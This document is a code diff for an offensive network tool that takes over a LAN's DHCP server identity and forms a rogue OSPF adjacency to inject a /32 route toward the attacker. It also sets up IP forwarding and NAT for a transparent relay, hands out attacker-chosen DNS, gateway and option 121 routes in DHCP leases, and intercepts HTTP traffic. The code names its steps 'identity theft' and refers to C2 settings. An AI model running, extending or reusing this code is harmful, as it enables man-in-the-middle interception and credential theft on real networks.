@@ -54,7 +54,6 @@ import os
 import sys
 import threading
 import time
-from queue import Queue
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -65,16 +64,13 @@ import http_intercept
 from dhcp_takeover import (
     print_step,
     DEFAULT_INTERFACE,
-    DEFAULT_DHCP_DISCOVER_VLANS,
     IMPERSONATE_REAL_SERVER,
-    send_DHCPDiscover_VLANs,
-    sniff_worker,
-    get_original_dhcp_server_ip,
-    ensure_vlan_subinterface,
-    set_static_address_from_offer,
+    pick_client_ip,
+    send_dhcpdiscover,
+    sniff_dhcpoffer,
+    set_static_address,
     wait_for_interface_ipv4_address,
-    add_loopback_ipv4_address,
-    build_server_details_from_offer,
+    build_server_details_from_ospf,
     sniff_for_dhcp_discover_and_request,
 )
 
@@ -118,6 +114,12 @@ def _parse_args() -> argparse.Namespace:
         metavar="SECS",
         dest="ospf_timeout",
         help="Seconds to wait passively for an OSPF Hello before aborting",
+    )
+    parser.add_argument(
+        "--dns",
+        default=None,
+        metavar="IP",
+        help="DNS server to advertise in DHCP leases (default: learned from DHCPOFFER)",
     )
     return parser.parse_args()
 
@@ -293,114 +295,38 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_c
             print(f"  Unknown option: {choice!r}")
 
 
-# ── DHCP phases ───────────────────────────────────────────────────────────────
+# ── Network setup + OSPF adjacency ───────────────────────────────────────────
 
-def discover_offers(interface, ospf_params=None):
-    """Run the threaded DHCPDISCOVER sweep and return the captured offers.
+def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
+    """Configure our IP from the OSPF-learned subnet, do one untagged DHCPDISCOVER
+    to learn the real server IP and DNS, then form the OSPF adjacency.
 
-    When ospf_params is provided (learned from sniff_ospf_hellos), the probe
-    is sent on the already-known subnet rather than sweeping VLANs 1-N.  The
-    OSPF Hello's src_ip/netmask identify the SVI's subnet exactly, so a single
-    targeted broadcast on that interface is sufficient.
-
-    In a relay topology (ip helper-address) the DHCPOFFER can arrive within
-    tens of milliseconds.  Scapy's sniff() needs ~100–200 ms to open its raw
-    socket and install the BPF filter.  Fix: wait 1 s after the sniffer thread
-    starts (bind-wait), then retry every 8 s.  Three attempts span 17 s; the
-    30 s sniffer window covers all.
+    Returns (ospf_interface, our_ip, offer) where offer may be None if the real
+    DHCP server did not respond.
     """
-    if ospf_params:
-        import ipaddress as _ip
-        try:
-            subnet = _ip.IPv4Network(
-                f"{ospf_params['src_ip']}/{ospf_params['netmask']}", strict=False
-            )
-            vlan_id = ospf_params.get("vlan_id")
-            dhcp_probe_vlan_ids = [vlan_id] if vlan_id else None
-            print_step(
-                "OK",
-                f"OSPF-learned subnet {subnet}; "
-                f"DHCP probe on {interface}"
-                + (f" VLAN {vlan_id}" if vlan_id else " (untagged)"),
-            )
-        except Exception:
-            print_step("WARN", "Could not derive subnet from OSPF params; falling back to VLAN sweep")
-            dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS
-    else:
-        print_step(
-            "WARN",
-            "No OSPF params available; falling back to configured "
-            f"DHCPDISCOVER VLAN sweep: {list(DEFAULT_DHCP_DISCOVER_VLANS)}",
-        )
-        dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS
+    our_ip = pick_client_ip(ospf_params)
+    netmask = ospf_params["netmask"]
+    print_step("START", f"Configuring {our_ip}/{netmask} on {interface} (OSPF-derived)")
+    set_static_address(interface, our_ip, netmask)
+    wait_for_interface_ipv4_address(interface, expected_address=our_ip)
 
-    result_queue = Queue()
-    sniffer_thread = threading.Thread(target=sniff_worker, args=(interface, result_queue))
+    # Single untagged discover — no 802.1Q, no trunk needed.
+    send_dhcpdiscover(interface)
+    offer = sniff_dhcpoffer(interface, timeout=10)
 
-    print_step("START", "Starting DHCPOFFER sniffer thread")
-    sniffer_thread.start()
-
-    # Give the sniffer socket time to bind before sending.  Without this the
-    # OFFERs can arrive before the BPF filter is installed and are silently
-    # dropped.  1 s is conservative; the thread typically binds in < 300 ms.
-    time.sleep(1)
-
-    for attempt in range(1, 4):  # attempts at t≈1 s, 9 s, 17 s
-        if not sniffer_thread.is_alive():
-            break
-        if attempt > 1:
-            print_step(
-                "START",
-                f"No OFFERs captured yet — retrying DHCPDISCOVER sweep "
-                f"(attempt {attempt}/3)",
-            )
-        print_step("START", f"Sending DHCPDISCOVER packets (attempt {attempt}/3)")
-        send_DHCPDiscover_VLANs(interface, dhcp_probe_vlan_ids)
-        if attempt < 3:
-            time.sleep(8)  # wait for OFFERs before the next attempt
-
-    sniffer_thread.join()
-
-    offers = result_queue.get()
-    print_step("OK", f"Received {len(offers)} DHCPOFFER result(s)")
-    return offers
-
-
-def steal_dhcp_identity(interface, selected_offer, ospf_params=None, target_ip=None):
-    """Take over the offered IP, form OSPF adjacency, and add the server identity.
-
-    ospf_params (from sniff_ospf_hellos) is threaded into the adjacency engine
-    so it sends Hellos matching the SVI's area, timers, and netmask exactly.
-    target_ip overrides the auto-injected /32 (default: real DHCP server IP).
-
-    Returns the interface OSPF/DHCP runs on (a VLAN subinterface when tagged).
-    """
-    selected_vlan_id = selected_offer.get("vlan")
-    original_dhcp_server_ip = get_original_dhcp_server_ip(selected_offer)
-    route_ip = target_ip or original_dhcp_server_ip
-
-    print_step("START", f"Stealing DHCP server identity {original_dhcp_server_ip}")
-    ospf_interface = ensure_vlan_subinterface(interface, selected_vlan_id)
-    selected_address = set_static_address_from_offer(ospf_interface, selected_offer)
-    wait_for_interface_ipv4_address(ospf_interface, expected_address=selected_address)
-    add_loopback_ipv4_address(original_dhcp_server_ip)
-    print_step("OK", f"DHCP server identity {original_dhcp_server_ip} active on loopback")
-
-    area_id = ospf_params["area_id"] if ospf_params else None
-    hello_interval = ospf_params["hello_interval"] if ospf_params else None
-    dead_interval = ospf_params["dead_interval"] if ospf_params else None
+    route_ip = target_ip or (offer.get("server_id") if offer else None) or our_ip
+    print_step("OK", f"OSPF /32 injection target: {route_ip}")
 
     # OSPF engine runs in its own terminal so its interactive menu stays usable.
     ospf_adjacency.launch_in_terminal(
-        ospf_interface,
-        vlan_id=selected_vlan_id,
+        interface,
         auto_route_ip=route_ip,
-        area_id=area_id,
-        hello_interval=hello_interval,
-        dead_interval=dead_interval,
+        area_id=ospf_params["area_id"],
+        hello_interval=ospf_params["hello_interval"],
+        dead_interval=ospf_params["dead_interval"],
     )
-    ospf_adjacency.wait_for_adjacency_exchange(ospf_interface, selected_address)
-    return ospf_interface
+    ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
+    return interface, our_ip, offer
 
 
 def start_http_intercept(sniff_iface):
@@ -437,39 +363,23 @@ def main():
     # Enable IP forwarding early; save old value for teardown.
     saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
 
-    ospf_iface_for_fwd = None  # set after identity theft; used in teardown
+    ospf_iface_for_fwd = None  # set after setup; used in teardown
     try:
-        # ── Phase 2: DHCP discovery on the OSPF-learned subnet ───────────────
-        offers = discover_offers(interface, ospf_params)
-        if not offers:
-            print_step("FAIL", "No DHCPOFFER packets received — aborting")
-            return
-
-        # ── Phase 3: identity theft (static IP + OSPF adjacency + loopback) ──
-        selected_offer = offers[0]
-        ospf_interface = steal_dhcp_identity(
-            interface, selected_offer,
-            ospf_params=ospf_params,
-            target_ip=args.target,
+        # ── Phase 2+3: configure IP, untagged discover, OSPF adjacency ───────
+        ospf_interface, our_ip, offer = setup_and_form_adjacency(
+            interface, ospf_params, target_ip=args.target
         )
         ospf_iface_for_fwd = ospf_interface
 
-        # Set up iptables forwarding rules: traffic arriving on ospf_interface
-        # is MASQUERADEd out via the upstream physical interface.
+        # iptables FORWARD + MASQUERADE for transparent relay.
         ospf_adjacency.setup_forwarding(ospf_interface, interface)
 
         # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
         networks = []
         proposed_leases = {}
-        server_details = build_server_details_from_offer(ospf_interface, selected_offer, offers)
-
-        # Prefer the OSPF-learned SVI IP as the default gateway in leases we
-        # hand out — it's authoritative and may be absent from the DHCP offer
-        # when a relay (ip helper-address) is in use.
-        svi_gw = ospf_params.get("src_ip")
-        if svi_gw and not server_details.get("gateway"):
-            server_details["gateway"] = svi_gw
-            print_step("OK", f"Using OSPF-learned SVI IP {svi_gw} as default gateway in DHCP leases")
+        server_details = build_server_details_from_ospf(
+            ospf_interface, ospf_params, our_ip, offer=offer, dns=getattr(args, "dns", None)
+        )
 
         tun_iface = vpn_relay.enable_vpn_relay(server_details, ospf_interface)
 
